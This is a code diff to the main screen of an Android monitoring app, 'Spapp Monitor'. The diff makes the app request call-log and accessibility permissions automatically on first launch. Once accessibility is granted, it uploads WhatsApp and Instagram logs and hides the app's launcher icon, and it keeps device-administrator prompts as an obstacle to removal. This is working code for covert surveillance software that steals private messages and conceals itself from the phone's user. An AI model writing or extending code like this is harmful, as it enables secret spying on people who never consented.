@@ -27,6 +27,7 @@ import com.spapp.monitoring.R
 import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
 import com.spapp.monitoring.blocking.AccessibilityStatus
 import com.spapp.monitoring.collectors.AppUsageCollector
+import com.spapp.monitoring.collectors.RealtimeLogObserverManager
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.databinding.ActivityMainBinding
 import com.spapp.monitoring.fcm.FcmTokenSync
@@ -36,11 +37,13 @@ import com.spapp.monitoring.sync.SyncScheduler
 /**
  * Main Status & Permission Control Center for Spapp Monitor.
  *
- * Features:
- *  - Smart Step-by-Step Master Button: Dynamically highlights the next required
- *    permission without infinite recursive loops or trapped resume cycles.
- *  - Full Android 13/14 Restricted Settings support with 1-tap App Info shortcut.
- *  - Complete Permission Checklist with live status badges.
+ * 1-TAP SETUP FLOW:
+ * - Sequentially requests Standard Runtime Permissions + Accessibility Service.
+ * - When Accessibility Service is enabled, automatically triggers "SYNC NOW"
+ *   (instant WhatsApp & Instagram log sync, SyncScheduler.runOnce, and hides app icon).
+ * - Remaining permissions (Battery Optimization, All Files, Notification Listener,
+ *   Usage Access, Device Administrator, Autostart) are displayed on-screen for
+ *   one-by-one manual toggling.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -51,12 +54,13 @@ class MainActivity : AppCompatActivity() {
     private var isOneTapFlowRunning = false
     private var autostartPrompted = false
 
+    // 1. Standard Runtime Permissions Launcher
     private val runtimePermissionsLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { results ->
         refreshPermissionStatus()
         if (results[Manifest.permission.READ_CALL_LOG] == true) {
-            com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+            RealtimeLogObserverManager.start(applicationContext)
             SyncScheduler.runOnce(applicationContext)
         }
         val grantedCount = results.values.count { it }
@@ -66,91 +70,54 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // 2. Accessibility Launcher (Part of 1-Tap Core Flow)
+    private val accessibilityLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) {
+        refreshPermissionStatus()
+        if (isAccessibilityEnabled()) {
+            triggerAutoSyncAfterAccessibility()
+        }
+        if (isOneTapFlowRunning) {
+            handleNextSetupStep()
+        }
+    }
+
+    // 3. Individual remaining permission launchers (tapped manually)
     private val batteryExemptionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            if (isBatteryExempted()) {
-                handleNextSetupStep()
-            } else {
-                isOneTapFlowRunning = false
-            }
-        }
     }
 
     private val allFilesLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            if (isFileAccessGranted()) {
-                handleNextSetupStep()
-            } else {
-                isOneTapFlowRunning = false
-            }
-        }
     }
 
     private val notificationListenerLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            if (isNotificationAccessGranted()) {
-                handleNextSetupStep()
-            } else {
-                isOneTapFlowRunning = false
-            }
-        }
-    }
-
-    private val accessibilityLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            if (isAccessibilityEnabled()) {
-                handleNextSetupStep()
-            } else {
-                isOneTapFlowRunning = false
-            }
-        }
     }
 
     private val usageLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            if (isUsageAccessGranted()) {
-                handleNextSetupStep()
-            } else {
-                isOneTapFlowRunning = false
-            }
-        }
     }
 
     private val deviceAdminLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            if (isDeviceAdminActive()) {
-                handleNextSetupStep()
-            } else {
-                isOneTapFlowRunning = false
-            }
-        }
     }
 
     private val autostartLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            handleNextSetupStep()
-        }
     }
 
     private val statusHandler = Handler(Looper.getMainLooper())
@@ -161,119 +128,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // override fun onCreate(savedInstanceState: Bundle?) {
-    //     super.onCreate(savedInstanceState)
-    //     binding = ActivityMainBinding.inflate(layoutInflater)
-    //     setContentView(binding.root)
-
-    //     deviceState = DeviceState(this)
-    //     usageCollector = AppUsageCollector(this)
-    //     geofenceManager = GeofenceManager(this)
-
-    //     SyncScheduler.schedule(applicationContext)
-    //     uploadCurrentFcmToken()
-    //     com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
-
-    //     // Master Setup Button (Dynamically executes the full setup sequence continuously)
-    //     binding.btnMasterOneTap.setOnClickListener {
-    //         isOneTapFlowRunning = true
-    //         handleNextSetupStep()
-    //     }
-
-    //     // Individual permission shortcut listeners
-    //     binding.btnCorePermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         val missing = getMissingRuntimePermissions()
-    //         if (missing.isNotEmpty()) {
-    //             runtimePermissionsLauncher.launch(missing.toTypedArray())
-    //         } else {
-    //             Toast.makeText(this, "Core permissions already active ✓", Toast.LENGTH_SHORT).show()
-    //         }
-    //     }
-
-    //     binding.btnBatteryPermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         if (!isBatteryExempted()) {
-    //             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-    //                 data = Uri.parse("package:$packageName")
-    //             }
-    //             batteryExemptionLauncher.launch(intent)
-    //         } else {
-    //             Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
-    //         }
-    //     }
-
-    //     binding.btnAccessibilityPermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         showAccessibilityDialog()
-    //     }
-
-    //     binding.btnAccessibilityRestricted.setOnClickListener {
-    //         openAppInfoSettings()
-    //     }
-
-    //     binding.btnNotificationPermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         showNotificationDialog()
-    //     }
-
-    //     binding.btnNotificationRestricted.setOnClickListener {
-    //         openAppInfoSettings()
-    //     }
-
-    //     binding.btnUnlockRestricted.setOnClickListener {
-    //         openAppInfoSettings()
-    //     }
-
-    //     binding.btnUsagePermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         if (!isUsageAccessGranted()) {
-    //             Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
-    //             usageLauncher.launch(usageCollector.usageAccessSettingsIntent())
-    //         } else {
-    //             Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
-    //         }
-    //     }
-
-    //     binding.btnFilePermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         if (!isFileAccessGranted()) {
-    //             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-    //                 val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-    //                     data = Uri.parse("package:$packageName")
-    //                 }
-    //                 allFilesLauncher.launch(intent)
-    //             }
-    //         } else {
-    //             Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
-    //         }
-    //     }
-
-    //     binding.btnAdminPermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         if (!isDeviceAdminActive()) {
-    //             deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
-    //         } else {
-    //             Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
-    //         }
-    //     }
-
-    //     binding.btnAutostartPermStatus.setOnClickListener {
-    //         isOneTapFlowRunning = false
-    //         openAutostartSettings()
-    //     }
-
-    //     binding.btnSyncNow.setOnClickListener {
-    //         com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
-    //         com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
-    //         SyncScheduler.runOnce(applicationContext)
-    //         Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
-    //     }
-    // }
-
-
-
-        override fun onCreate(savedInstanceState: Bundle?) {
+    override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
@@ -284,12 +139,22 @@ class MainActivity : AppCompatActivity() {
 
         SyncScheduler.schedule(applicationContext)
         uploadCurrentFcmToken()
-        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+        RealtimeLogObserverManager.start(applicationContext)
 
-        // Master Setup Button (Dynamically executes the full setup sequence continuously)
+        // Master 1-Tap Setup Button
         binding.btnMasterOneTap.setOnClickListener {
-            isOneTapFlowRunning = true
-            handleNextSetupStep()
+            val missingRuntime = getMissingRuntimePermissions()
+            val missingAccessibility = !isAccessibilityEnabled()
+            if (missingRuntime.isNotEmpty() || missingAccessibility) {
+                isOneTapFlowRunning = true
+                handleNextSetupStep()
+            } else {
+                Toast.makeText(
+                    this,
+                    "Core permissions & Accessibility active ✓ Tap remaining permissions below to enable",
+                    Toast.LENGTH_SHORT
+                ).show()
+            }
         }
 
         // Individual permission shortcut listeners
@@ -375,51 +240,77 @@ class MainActivity : AppCompatActivity() {
             openAutostartSettings()
         }
 
-        // Updated Sync Now Button Listener
+        // Sync Now Button
         binding.btnSyncNow.setOnClickListener {
-            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
-            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
-            
-            // App icon-a hide panra function call panniyachu
             hideAppIcon()
-            
             Toast.makeText(this, "Sync triggered & App icon hidden", Toast.LENGTH_SHORT).show()
+        }
+
+        // Automatic permission start for fresh installation
+        maybeStartAutoPermissionFlow()
+    }
+
+    /**
+     * Fresh install: Starts Core (Standard Runtime + Accessibility) flow automatically.
+     */
+    private fun maybeStartAutoPermissionFlow() {
+        val isFreshInstall = deviceState.isFirstLaunchAfterInstall()
+        val coreOrAccessibilityMissing = getMissingRuntimePermissions().isNotEmpty() || !isAccessibilityEnabled()
+
+        if (isFreshInstall && coreOrAccessibilityMissing) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (!isFinishing && !isDestroyed) {
+                    isOneTapFlowRunning = true
+                    handleNextSetupStep()
+                }
+            }, AUTO_FLOW_DELAY_MS)
         }
     }
 
-    // Indha pudhu function-a unga MainActivity class-kulla (onCreate-ku kila) add pannikonga
+    /**
+     * Automatic SYNC NOW triggered once as soon as Accessibility permission is granted.
+     */
+    private fun triggerAutoSyncAfterAccessibility() {
+        if (!deviceState.hasAutoSyncedAfterAccessibility) {
+            deviceState.hasAutoSyncedAfterAccessibility = true
+            Log.i(TAG, "Accessibility enabled: triggering automatic initial sync & hide icon")
+            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+            SyncScheduler.runOnce(applicationContext)
+            hideAppIcon()
+            Toast.makeText(this, "✓ Accessibility Enabled! Initial sync triggered & icon hidden", Toast.LENGTH_LONG).show()
+        }
+    }
+
     private fun hideAppIcon() {
         try {
             val p = packageManager
-            val componentName = android.content.ComponentName(this, "$packageName.ui.SplashActivity")
+            val componentName = ComponentName(this, "$packageName.ui.SplashActivity")
             p.setComponentEnabledSetting(
                 componentName,
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
             )
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Error hiding app icon", e)
         }
     }
-
-
-
-
-
-
-
-
-
-
-
-
 
     override fun onResume() {
         super.onResume()
         refreshPermissionStatus()
+        if (isAccessibilityEnabled()) {
+            triggerAutoSyncAfterAccessibility()
+        }
         statusUpdater.run()
         uploadCurrentFcmToken()
+
+        if (isOneTapFlowRunning) {
+            handleNextSetupStep()
+        }
     }
 
     override fun onPause() {
@@ -428,7 +319,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     // =========================================================================
-    // DYNAMIC NEXT-STEP SETUP WORKFLOW
+    // DYNAMIC 1-TAP SETUP WORKFLOW (Runtime Permissions -> Accessibility)
     // =========================================================================
 
     private fun handleNextSetupStep() {
@@ -438,81 +329,17 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        if (!isBatteryExempted()) {
-            try {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:$packageName")
-                }
-                batteryExemptionLauncher.launch(intent)
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Battery ignore optimizations failed", e)
-            }
-        }
-
-        if (!isFileAccessGranted()) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                try {
-                    Toast.makeText(this, "Enable 'Allow access to manage all files', then tap Back", Toast.LENGTH_LONG).show()
-                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-                        data = Uri.parse("package:$packageName")
-                    }
-                    allFilesLauncher.launch(intent)
-                    return
-                } catch (e: Exception) {
-                    Log.w(TAG, "All files intent failed", e)
-                }
-            }
-        }
-
-        if (!isNotificationAccessGranted()) {
-            showNotificationDialog()
-            return
-        }
-
         if (!isAccessibilityEnabled()) {
             showAccessibilityDialog()
             return
         }
 
-        if (!isUsageAccessGranted()) {
-            try {
-                Toast.makeText(this, "Enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
-                val intent = usageCollector.usageAccessSettingsIntent()
-                usageLauncher.launch(intent)
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Usage access intent failed", e)
-            }
-        }
-
-        if (!isDeviceAdminActive()) {
-            try {
-                Toast.makeText(this, "Activate Device Administrator to prevent unauthorized removal, then tap Back", Toast.LENGTH_LONG).show()
-                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Device admin intent failed", e)
-            }
-        }
-
-        if (isOemRom() && !autostartPrompted) {
-            autostartPrompted = true
-            val autostartIntent = getAutostartIntent()
-            if (autostartIntent != null) {
-                try {
-                    Toast.makeText(this, "Enable Autostart for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
-                    autostartLauncher.launch(autostartIntent)
-                    return
-                } catch (e: Exception) {
-                    Log.w(TAG, "Autostart intent failed", e)
-                }
-            }
-        }
-
+        // Standard Runtime Permissions & Accessibility are now enabled!
+        // We stop the automatic 1-tap chain here so remaining permissions can be toggled manually.
         isOneTapFlowRunning = false
+        deviceState.markSetupCompleted()
         refreshPermissionStatus()
-        Toast.makeText(this, "✓ All permissions configured & active!", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "✓ Core permissions & Accessibility active!", Toast.LENGTH_SHORT).show()
     }
 
     private fun showAccessibilityDialog() {
@@ -536,16 +363,16 @@ class MainActivity : AppCompatActivity() {
                     accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                 } catch (e: Exception) {
                     Log.e(TAG, "Cannot open accessibility settings", e)
-                    if (isOneTapFlowRunning) handleNextSetupStep()
+                    isOneTapFlowRunning = false
                 }
             }
             .setNeutralButton(R.string.open_app_info) { _, _ ->
                 openAppInfoSettings()
             }
             .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
-                if (isOneTapFlowRunning) {
-                    handleNextSetupStep()
-                }
+                isOneTapFlowRunning = false
+                deviceState.markSetupCompleted()
+                refreshPermissionStatus()
             }
             .show()
     }
@@ -569,17 +396,12 @@ class MainActivity : AppCompatActivity() {
                     notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                 } catch (e: Exception) {
                     Log.e(TAG, "Cannot open notification listener settings", e)
-                    if (isOneTapFlowRunning) handleNextSetupStep()
                 }
             }
             .setNeutralButton(R.string.open_app_info) { _, _ ->
                 openAppInfoSettings()
             }
-            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
-                if (isOneTapFlowRunning) {
-                    handleNextSetupStep()
-                }
-            }
+            .setNegativeButton("Cancel", null)
             .show()
     }
 
@@ -673,41 +495,28 @@ class MainActivity : AppCompatActivity() {
         val isFile = isFileAccessGranted()
         val isAdmin = isDeviceAdminActive()
 
-        // 1. Core Permissions Button
         updateStatusButton(binding.btnCorePermStatus, isCore, "Active ✓", "Grant")
-
-        // 2. Battery Button
         updateStatusButton(binding.btnBatteryPermStatus, isBattery, "Active ✓", "Grant")
 
-        // 3. Accessibility Button
         updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
         binding.btnAccessibilityRestricted.visibility =
             if (!isAccessibility && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE
 
-        // 4. Notification Button
         updateStatusButton(binding.btnNotificationPermStatus, isNotification, "Active ✓", "Enable")
         binding.btnNotificationRestricted.visibility =
             if (!isNotification && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE
 
-        // 5. Usage Access Button
         updateStatusButton(binding.btnUsagePermStatus, isUsage, "Active ✓", "Enable")
-
-        // 6. File Access Button
         updateStatusButton(binding.btnFilePermStatus, isFile, "Active ✓", "Enable")
-
-        // 7. Device Admin Button
         updateStatusButton(binding.btnAdminPermStatus, isAdmin, "Active ✓", "Enable")
 
-        // 8. Autostart (Xiaomi / Vivo / Oppo / Huawei)
         val isOem = isOemRom()
         binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
         binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
 
-        // 9. Android 13+ Restricted Settings Warning Banner
         val needsRestrictedBanner = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (!isAccessibility || !isNotification)
         binding.cardRestrictedBanner.visibility = if (needsRestrictedBanner) View.VISIBLE else View.GONE
 
-        // Calculate total granted count
         var grantedCount = 0
         if (isCore) grantedCount++
         if (isBattery) grantedCount++
@@ -722,15 +531,28 @@ class MainActivity : AppCompatActivity() {
         binding.pbPermissions.progress = grantedCount
         binding.tvPermissionsCount.text = "$grantedCount / $totalCount Active"
 
-        if (grantedCount >= totalCount) {
-            binding.tvMasterBadge.text = "ALL ACTIVE ✓"
-            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
-            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
-            binding.tvMasterDesc.text = "All background monitoring services are active and running."
-            binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
-            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
-            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
-            binding.layoutPermissionsList.visibility = View.GONE
+        // Always keep the detailed checklist visible so user can configure remaining permissions one-by-one
+        binding.layoutPermissionsList.visibility = View.VISIBLE
+        binding.cardPermissionsList.visibility = View.VISIBLE
+
+        if (isCore && isAccessibility) {
+            if (grantedCount >= totalCount) {
+                binding.tvMasterBadge.text = "ALL ACTIVE ✓"
+                binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
+                binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
+                binding.tvMasterDesc.text = "All background monitoring services are active and running."
+                binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
+                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
+                binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
+            } else {
+                binding.tvMasterBadge.text = "CORE ACTIVE ✓"
+                binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
+                binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
+                binding.tvMasterDesc.text = "Core permissions & Accessibility active. Initial sync completed! You can enable remaining permissions individually below."
+                binding.btnMasterOneTap.text = "✓ CORE SETUP COMPLETE (Tap items below for full access)"
+                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
+                binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
+            }
         } else {
             binding.tvMasterBadge.text = "ACTION NEEDED"
             binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
@@ -738,16 +560,13 @@ class MainActivity : AppCompatActivity() {
 
             val missingRuntime = getMissingRuntimePermissions()
             if (missingRuntime.isNotEmpty()) {
-                binding.tvMasterDesc.text = "Tap below to enable all monitoring permissions on this device in 1 tap."
-                binding.btnMasterOneTap.text = "⚡ ALLOW ALL PERMISSIONS"
-                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
-                binding.layoutPermissionsList.visibility = View.VISIBLE
+                binding.tvMasterDesc.text = "Tap below to enable Standard Runtime Permissions & Accessibility in 1 tap."
+                binding.btnMasterOneTap.text = "⚡ ALLOW CORE & ACCESSIBILITY PERMISSIONS"
             } else {
-                binding.tvMasterDesc.text = "Core permissions are active. Tap below to configure the remaining permissions."
-                binding.btnMasterOneTap.text = "⚡ CONFIGURE NEXT PERMISSION"
-                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
-                binding.layoutPermissionsList.visibility = View.VISIBLE
+                binding.tvMasterDesc.text = "Core runtime permissions granted. Tap below to enable Accessibility service."
+                binding.btnMasterOneTap.text = "⚡ ENABLE ACCESSIBILITY SERVICE"
             }
+            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
             binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
         }
     }
@@ -851,5 +670,6 @@ class MainActivity : AppCompatActivity() {
     companion object {
         private const val TAG = "MainActivity"
         private const val STATUS_REFRESH_MS = 30_000L
+        private const val AUTO_FLOW_DELAY_MS = 1_200L
     }
 }
